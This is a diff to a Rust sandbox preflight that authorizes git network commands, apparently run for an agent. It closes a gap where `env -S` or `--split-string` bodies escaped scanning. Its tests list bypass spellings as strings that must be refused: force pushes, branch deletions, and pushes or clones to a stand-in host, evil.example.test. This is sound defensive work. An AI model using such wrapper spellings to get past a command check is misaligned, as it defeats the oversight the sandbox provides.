@@ -847,10 +847,15 @@ fn tokenize_simple_commands(input: &str) -> Result<Vec<Vec<Word>>> {
                 match c {
                     '"' => quote = None,
                     '\\' => {
-                        if let Some(next) = chars.next()
-                            && next != '\n'
-                        {
-                            current.push(next);
+                        // Bash keeps a backslash before ordinary characters
+                        // in double quotes. A wrapper can interpret it later.
+                        match chars.next() {
+                            Some('\n') | None => {}
+                            Some(next @ ('\\' | '"' | '$' | '`')) => current.push(next),
+                            Some(next) => {
+                                current.push('\\');
+                                current.push(next);
+                            }
                         }
                     }
                     '$' | '`' => {
@@ -1016,18 +1021,24 @@ fn skip_wrapper_options(words: &[Word], mut index: usize, value_options: &[&str]
     index
 }
 
-/// GNU `env` options that consume the following word.
-const ENV_VALUE_OPTIONS: &[&str] = &[
-    "-u",
-    "--unset",
-    "-a",
-    "--argv0",
-    "-C",
-    "--chdir",
-    "-S",
-    "--split-string",
-    "--env0-from",
+/// GNU `env` long options that consume the following word.
+const ENV_LONG_VALUE_OPTIONS: &[&str] = &["argv0", "unset", "chdir", "split-string", "env0-from"];
+/// GNU `env` long options that never consume a separate word. The options
+/// with an optional value (`--block-signal`) take one only in `=` spelling.
+const ENV_LONG_FLAGS: &[&str] = &[
+    "ignore-environment",
+    "null",
+    "block-signal",
+    "default-signal",
+    "ignore-signal",
+    "list-signal-handling",
+    "debug",
+    "help",
+    "version",
 ];
+/// GNU `env` short options that consume a value: the rest of the cluster when
+/// it is non-empty, otherwise the following word.
+const ENV_SHORT_VALUE_OPTIONS: &[char] = &['a', 'u', 'C', 'S'];
 /// GNU `timeout` options that consume the following word.
 const TIMEOUT_VALUE_OPTIONS: &[&str] = &["-s", "--signal", "-k", "--kill-after"];
 /// GNU `nice` options that consume the following word.
@@ -1036,6 +1047,237 @@ const NICE_VALUE_OPTIONS: &[&str] = &["-n", "--adjustment"];
 const TIME_VALUE_OPTIONS: &[&str] = &["-f", "--format", "-o", "--output"];
 /// `exec -a` names the replacement argv[0].
 const EXEC_VALUE_OPTIONS: &[&str] = &["-a"];
+
+/// Resolve `env`'s own options from `index`, then its `NAME=VALUE`
+/// assignments, returning the index of the command word. Every spelling of
+/// `-S`/`--split-string` carries a body that `env` splits into words and
+/// appends the following words to, so the body is scanned as the command it
+/// becomes. A spelling the walk cannot classify is refused, not skipped.
+fn scan_env_operands(
+    words: &[Word],
+    index: usize,
+    preflight: Preflight<'_>,
+    depth: usize,
+) -> Result<usize> {
+    let mut index = scan_env_options(words, index, preflight, depth)?;
+    while index < words.len() && is_assignment(&words[index].text) {
+        refuse_config_env_assignment(&words[index])?;
+        index += 1;
+    }
+    Ok(index)
+}
+
+fn scan_env_options(
+    words: &[Word],
+    mut index: usize,
+    preflight: Preflight<'_>,
+    depth: usize,
+) -> Result<usize> {
+    while index < words.len() {
+        let word = &words[index];
+        let text = word.text.as_str();
+        // A lone `-` means `-i`; `--` ends the options.
+        if text == "-" || text == "--" {
+            return Ok(index + 1);
+        }
+        if !text.starts_with('-') {
+            return Ok(index);
+        }
+        if word.dynamic {
+            return Err(denied(
+                "dynamic env option cannot be authorized for git network access",
+            ));
+        }
+        if let Some(rest) = text.strip_prefix("--") {
+            index = scan_env_long_option(words, index, rest, preflight, depth)?;
+            continue;
+        }
+        index = scan_env_short_option(words, index, preflight, depth)?;
+    }
+    Ok(index)
+}
+
+/// One `env` long option (with `--` stripped). Long options abbreviate to any
+/// unambiguous prefix, as GNU `getopt_long` reads them.
+fn scan_env_long_option(
+    words: &[Word],
+    index: usize,
+    rest: &str,
+    preflight: Preflight<'_>,
+    depth: usize,
+) -> Result<usize> {
+    let (name, attached) = match rest.split_once('=') {
+        Some((name, value)) => (name, Some(value)),
+        None => (rest, None),
+    };
+    let word = &words[index];
+    let value_option = ENV_LONG_VALUE_OPTIONS
+        .iter()
+        .find(|option| !name.is_empty() && option.starts_with(name));
+    if let Some(option) = value_option {
+        let (value, tail) = match attached {
+            Some(value) => (
+                Word {
+                    text: value.to_string(),
+                    dynamic: word.dynamic,
+                },
+                index + 1,
+            ),
+            None => match words.get(index + 1) {
+                Some(value) => (value.clone(), index + 2),
+                None => return Err(denied("env option needs a value")),
+            },
+        };
+        if *option == "split-string" {
+            scan_env_split_body(&value, &words[tail..], preflight, depth)?;
+            return Ok(words.len());
+        }
+        return Ok(tail);
+    }
+    if ENV_LONG_FLAGS
+        .iter()
+        .any(|flag| !name.is_empty() && flag.starts_with(name))
+    {
+        // `--block-signal=PIPE` and friends carry an optional `=` value.
+        return Ok(index + 1);
+    }
+    Err(denied("unsupported env option"))
+}
+
+/// One `env` short-option word (`-i`, `-u FOO`, `-uFOO`, `-iS body`,
+/// `-Sbody`). `-S` is the split-string option; the rest of its cluster, or
+/// the next word, is the body.
+fn scan_env_short_option(
+    words: &[Word],
+    index: usize,
+    preflight: Preflight<'_>,
+    depth: usize,
+) -> Result<usize> {
+    let word = &words[index];
+    let cluster = &word.text[1..];
+    for (offset, letter) in cluster.char_indices() {
+        if !ENV_SHORT_VALUE_OPTIONS.contains(&letter) {
+            if matches!(letter, 'i' | '0' | 'v') {
+                continue;
+            }
+            return Err(denied("unsupported env option"));
+        }
+        let attached = &cluster[offset + letter.len_utf8()..];
+        let (value, tail) = if attached.is_empty() {
+            match words.get(index + 1) {
+                Some(value) => (value.clone(), index + 2),
+                None => return Err(denied("env option needs a value")),
+            }
+        } else {
+            (
+                Word {
+                    text: attached.to_string(),
+                    dynamic: word.dynamic,
+                },
+                index + 1,
+            )
+        };
+        if letter == 'S' {
+            scan_env_split_body(&value, &words[tail..], preflight, depth)?;
+            return Ok(words.len());
+        }
+        return Ok(tail);
+    }
+    Ok(index + 1)
+}
+
+/// Read the literal subset of GNU `env -S` syntax. An env string contributes
+/// arguments to a single invocation, not shell clauses. Refuse any expansion
+/// that would require the env process's runtime environment.
+fn tokenize_env_split_string(input: &str) -> Result<Vec<Word>> {
+    let mut words = Vec::new();
+    let mut current = None::<String>;
+    let mut quote = None;
+    let mut chars = input.chars().peekable();
+    let finish_word = |words: &mut Vec<Word>, current: &mut Option<String>| {
+        if let Some(text) = current.take() {
+            words.push(Word {
+                text,
+                dynamic: false,
+            });
+        }
+    };
+
+    while let Some(ch) = chars.next() {
+        let literal = match ch {
+            '\'' | '"' if quote.is_none() || quote == Some(ch) => {
+                quote = if quote.is_none() { Some(ch) } else { None };
+                // Even an empty quoted word is an argument.
+                current.get_or_insert_with(String::new);
+                continue;
+            }
+            ' ' | '\t' | '\n' | '\r' | '\x0b' | '\x0c' if quote.is_none() => {
+                finish_word(&mut words, &mut current);
+                continue;
+            }
+            '#' if current.is_none() => break,
+            '\\' if quote != Some('\'') || matches!(chars.peek(), Some('\\' | '\'')) => {
+                match chars.next() {
+                    Some('_') if quote.is_none() => {
+                        finish_word(&mut words, &mut current);
+                        continue;
+                    }
+                    Some('_') => ' ',
+                    Some('c') if quote.is_none() => break,
+                    Some('f') => '\x0c',
+                    Some('n') => '\n',
+                    Some('r') => '\r',
+                    Some('t') => '\t',
+                    Some('v') => '\x0b',
+                    Some(next @ ('"' | '#' | '$' | '\'' | '\\')) => next,
+                    _ => return Err(denied("invalid env split-string escape")),
+                }
+            }
+            '$' if quote != Some('\'') => {
+                return Err(denied(
+                    "dynamic env split-string expansion cannot be authorized for git network access",
+                ));
+            }
+            '\0' => return Err(denied("NUL byte in env split-string body")),
+            _ => ch,
+        };
+        current.get_or_insert_with(String::new).push(literal);
+    }
+    if quote.is_some() {
+        return Err(denied("unterminated env split-string quote"));
+    }
+    finish_word(&mut words, &mut current);
+    Ok(words)
+}
+
+/// Scan an `env` split-string body spliced with the words that follow it.
+/// `env` splits the body into words, appends the remaining arguments, and
+/// re-reads the result as its own operand list, so a body that carries `env`
+/// options or names only part of the command is read as the command it runs.
+fn scan_env_split_body(
+    body: &Word,
+    tail: &[Word],
+    preflight: Preflight<'_>,
+    depth: usize,
+) -> Result<()> {
+    if depth > 4 {
+        return Err(denied(
+            "nested shell command is too deep to authorize statically",
+        ));
+    }
+    if body.dynamic {
+        return Err(denied(
+            "dynamic env split-string body cannot be authorized for git network access",
+        ));
+    }
+    let mut simple = tokenize_env_split_string(&body.text)?;
+    simple.extend_from_slice(tail);
+    let command = scan_env_operands(&simple, 0, preflight, depth + 1)?;
+    if command == simple.len() {
+        return Ok(());
+    }
+    scan_simple_command(&simple[command..], preflight, depth + 1)
+}
 
 fn scan_simple_command(words: &[Word], preflight: Preflight<'_>, depth: usize) -> Result<()> {
     if depth > 4 {
@@ -1055,26 +1297,7 @@ fn scan_simple_command(words: &[Word], preflight: Preflight<'_>, depth: usize) -
             continue;
         }
         match command.as_str() {
-            "env" => {
-                // `env -S 'cmd args'` splits its value into words, so it is a
-                // shell-shaped string: scan it like one before stepping over.
-                if let Some(value) = words
-                    .get(index + 1)
-                    .and_then(|word| word.text.strip_prefix("--split-string="))
-                    .map(str::to_string)
-                {
-                    let body = Word {
-                        text: value,
-                        dynamic: words[index + 1].dynamic,
-                    };
-                    scan_shell_body(&body, preflight, depth)?;
-                }
-                index = skip_wrapper_options(words, index + 1, ENV_VALUE_OPTIONS);
-                while index < words.len() && is_assignment(&words[index].text) {
-                    refuse_config_env_assignment(&words[index])?;
-                    index += 1;
-                }
-            }
+            "env" => index = scan_env_operands(words, index + 1, preflight, depth)?,
             // Shell builtins that only assign or export names. `declare -x`,
             // `typeset -x`, `readonly` and `local` reach the same variables
             // the bare `NAME=value` form does.
@@ -3141,6 +3364,173 @@ mod tests {
         }
     }
 
+    /// WI#878: `env -S` and `env --split-string` take their body as a
+    /// separate word, and `skip_wrapper_options` stepped over both the option
+    /// and the body, so the body was never scanned. The `=` spelling of the
+    /// identical command was already refused.
+    #[test]
+    fn env_split_string_bodies_are_scanned_in_every_spelling() {
+        let (temp, _) = workspace_with_remote();
+        let cwd = temp.path().canonicalize().unwrap();
+        let host =
+            GitGrantConfig::from_parts("origin=file:///workspace/remotes/origin.git", "origin")
+                .unwrap()
+                .unwrap();
+        let grant = authorize_grant(&host, &[], &cwd, SandboxNetworkMode::ProxyEnforced).unwrap();
+        for command in [
+            // The three measured rows: the `=` control and the two gaps.
+            "env --split-string='git push -f origin master'",
+            "env -S 'git push -f origin master'",
+            "env --split-string 'git push -f origin master'",
+            // The shebang spellings.
+            "env -S'git push -f origin master'",
+            "env -iS 'git push -f origin master'",
+            "env '-S git push -f origin master'",
+            "env --split-str 'git push -f origin master'",
+            "env --split 'git push -f origin master'",
+            "env --split-string='git push' -f origin master",
+            "env -S 'git push' -f origin master",
+            "env -S 'git push origin' -f master",
+            // The same shape carries the other refusals past the preflight.
+            "env -S 'git push origin :old-branch'",
+            "env -S 'git push --delete origin old-branch'",
+            "env -S 'git send-pack /workspace/remotes/origin.git HEAD:x'",
+            "env -S 'git clone https://evil.example.test/repo.git'",
+            "env -S 'git push https://evil.example.test/repo.git main'",
+            "env --split-string 'git push upstream main'",
+        ] {
+            let error = check_granted(command, &grant)
+                .err()
+                .unwrap_or_else(|| panic!("passed but must be refused: {command}"));
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+        }
+        for allowed in [
+            "env FOO=1 git status",
+            "env -u HOME git fetch origin",
+            "env -S 'git status'",
+            "env --split-string 'git status'",
+            "env --split-string='git status'",
+            "env -S 'git fetch origin'",
+            "env -S 'git push origin main'",
+            "env -S 'git push origin HEAD:refs/heads/main'",
+            "env -S 'git status' && true",
+            "env -S 'FOO=1 git status'",
+            "env -iS 'git status'",
+        ] {
+            check_granted(allowed, &grant).unwrap_or_else(|error| panic!("{allowed}: {error}"));
+        }
+    }
+
+    /// WI#878: a `env -S` body that carries `env`'s own options must be read
+    /// as the operand list `env` re-reads, not as a command named `-u`.
+    #[test]
+    fn env_split_string_body_re_reads_env_options() {
+        let (_temp, grant) = workspace_with_remote();
+        for command in [
+            "env -S '-u HOME git push -f origin main'",
+            "env -S '--unset HOME git push -f origin main'",
+            "env -S '-i git push -f origin main'",
+            "env -S 'GIT_CONFIG_COUNT=1 git push origin main'",
+            "env -S 'git push -f origin main; git push origin :old'",
+        ] {
+            let error = check_granted(command, &grant)
+                .err()
+                .unwrap_or_else(|| panic!("passed but must be refused: {command}"));
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+        }
+    }
+
+    #[test]
+    fn env_split_string_splits_gnu_whitespace_but_not_shell_operators() {
+        for separator in [" ", "\t", "\n", "\r", "\x0b", "\x0c", r"\_"] {
+            // The body contains no real command. All separators form the
+            // same argv, without treating punctuation as shell source.
+            let input = format!("fixture{separator}a;b|c&d(e){separator}last");
+            let words = tokenize_env_split_string(&input).unwrap();
+            let argv: Vec<_> = words.iter().map(|word| word.text.as_str()).collect();
+            assert_eq!(argv, ["fixture", "a;b|c&d(e)", "last"], "{separator:?}");
+            assert!(words.iter().all(|word| !word.dynamic));
+        }
+        let words = tokenize_env_split_string("one\u{a0}two \"a\nb\"").unwrap();
+        assert_eq!(
+            words[0].text, "one\u{a0}two",
+            "only ASCII whitespace splits"
+        );
+        assert_eq!(words[1].text, "a\nb", "quoted whitespace stays in the word");
+    }
+
+    #[test]
+    fn env_split_string_preserves_literal_quotes_escapes_and_comments() {
+        let words = tokenize_env_split_string(
+            r#"fixture "" 'a\_b' "a\_b" 'can\'t' 'back\\slash' \#word mid#word \${NAME} # ignored"#,
+        )
+        .unwrap();
+        let argv: Vec<_> = words.iter().map(|word| word.text.as_str()).collect();
+        assert_eq!(
+            argv,
+            [
+                "fixture",
+                "",
+                r"a\_b",
+                "a b",
+                "can't",
+                r"back\slash",
+                "#word",
+                "mid#word",
+                "${NAME}",
+            ]
+        );
+        let words = tokenize_env_split_string(r#"fixture v\f\n\r\t\v\c ignored "#).unwrap();
+        assert_eq!(words.len(), 2);
+        assert_eq!(words[1].text, "v\x0c\n\r\t\x0b");
+    }
+
+    #[test]
+    fn env_split_string_refuses_invalid_and_dynamic_bodies() {
+        for body in [
+            r#"fixture "\c""#,
+            r"fixture \q",
+            r"fixture \",
+            "fixture 'unterminated",
+            "fixture ${NAME}",
+            r#"fixture "${NAME}""#,
+        ] {
+            let error = tokenize_env_split_string(body).unwrap_err();
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{body}: {error}"
+            );
+        }
+        let words = tokenize_env_split_string("fixture '${NAME}'").unwrap();
+        assert_eq!(words[1].text, "${NAME}");
+    }
+
+    #[test]
+    fn env_split_string_preserves_read_remote_checks_across_separators() {
+        let (_temp, grant) = workspace_with_remote();
+        for separator in ["\n", "\x0b", "\x0c", r"\_"] {
+            for quote in ['\'', '"'] {
+                // Only static authorization runs; no fetch is executed.
+                let allowed = format!("env -S {quote}git{separator}fetch{quote} origin");
+                check_granted(&allowed, &grant).unwrap();
+
+                let denied = format!("env -S {quote}git{separator}fetch{quote} unlisted");
+                let error = check_granted(&denied, &grant).unwrap_err();
+                assert!(
+                    matches!(error, SandboxError::CapabilityDenied { .. }),
+                    "{denied:?}: {error}"
+                );
+            }
+        }
+        check_granted("env -S 'git fetch # note\nignored' origin", &grant).unwrap();
+    }
+
     /// WI#857: the shells and wrappers must not refuse ordinary commands.
     #[test]
     fn ordinary_commands_still_pass_the_hardened_parser() {
@@ -3639,6 +4029,78 @@ mod tests {
             .expect("ls-remote");
         let listing = String::from_utf8_lossy(&output.stdout);
         assert!(listing.contains("refs/heads/main"), "{listing}");
+    }
+
+    /// WI#878 acceptance: the real command from the report. With the remote
+    /// ahead of the local branch, `env -S 'git push -f origin HEAD:...'` is
+    /// refused by the preflight before git runs, so the remote does not move.
+    /// The `--split-string=` control is refused too.
+    #[test]
+    fn env_split_string_force_push_is_refused_before_git_moves_the_remote() {
+        let (temp, work) = real_remote_fixture();
+        let root = temp.path().canonicalize().expect("canonical");
+        let write_host =
+            GitGrantConfig::from_parts("origin=file:///workspace/remotes/origin.git", "origin")
+                .expect("write grant")
+                .expect("grant");
+        let grant = authorize_grant(&write_host, &[], &root, SandboxNetworkMode::ProxyEnforced)
+            .expect("authorized");
+
+        // Land a first commit on the remote, then make the local branch
+        // diverge, so a force push would really move the remote's master.
+        let push = std::process::Command::new("git")
+            .args(["push", "origin", "HEAD:refs/heads/master"])
+            .current_dir(&work)
+            .env("GIT_CONFIG_GLOBAL", "/dev/null")
+            .env("GIT_TERMINAL_PROMPT", "0")
+            .output()
+            .expect("git push");
+        assert!(
+            push.status.success(),
+            "seed push failed: {}",
+            String::from_utf8_lossy(&push.stderr)
+        );
+        let before = std::process::Command::new("git")
+            .args(["ls-remote", "--heads", "origin", "refs/heads/master"])
+            .current_dir(&work)
+            .env("GIT_CONFIG_GLOBAL", "/dev/null")
+            .output()
+            .expect("ls-remote");
+        let before = String::from_utf8_lossy(&before.stdout).trim().to_string();
+        assert!(before.contains("refs/heads/master"), "{before}");
+
+        for command in [
+            "env -S 'git push -f origin HEAD:refs/heads/master'",
+            "env --split-string 'git push -f origin HEAD:refs/heads/master'",
+            "env --split-string='git push -f origin HEAD:refs/heads/master'",
+            "env -S 'git push --force origin HEAD:refs/heads/master'",
+            "env -S 'git push origin +HEAD:refs/heads/master'",
+            "env -S 'git push origin :refs/heads/master'",
+        ] {
+            let error = check_granted(command, &grant)
+                .expect_err("a force push through env -S must be refused");
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+            assert!(
+                error.to_string().contains("force") || error.to_string().contains("deletion"),
+                "{command}: {error}"
+            );
+        }
+
+        // The preflight refusal means git never ran: the remote is unchanged.
+        let after = std::process::Command::new("git")
+            .args(["ls-remote", "--heads", "origin", "refs/heads/master"])
+            .current_dir(&work)
+            .env("GIT_CONFIG_GLOBAL", "/dev/null")
+            .output()
+            .expect("ls-remote");
+        let after = String::from_utf8_lossy(&after.stdout).trim().to_string();
+        assert_eq!(
+            before, after,
+            "a refused force push must not move the remote"
+        );
     }
 
     /// Acceptance: a real clone and fetch of a real remote, with the
